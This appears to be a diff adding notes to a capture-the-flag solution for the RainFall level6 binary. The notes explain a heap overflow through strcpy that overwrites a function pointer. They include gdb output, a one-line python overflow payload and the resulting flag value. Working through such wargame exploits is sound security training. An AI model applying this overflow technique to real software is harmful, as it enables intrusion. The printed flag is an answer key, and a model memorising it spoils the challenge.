@@ -1,2 +1,11 @@
+in this level, the program allocate 64 bytes for a string then allocate 4 bytes to hold the address of a function that prints a message
+in the first allocation we use strcpy to copy the content of the first arg of the program
+strcpy does not handle overflow so we can give a string that will erase the value of the second allocation so that it points to the function n that opens the shell and cat the flag
+
+(gdb) x n
+0x8048454 <n>:	0x83e58955
+
+the second allocation is located 72 bytes after the first one, so we can give 72 random bytes then give the address of n
+
 level6@RainFall:~$ ./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
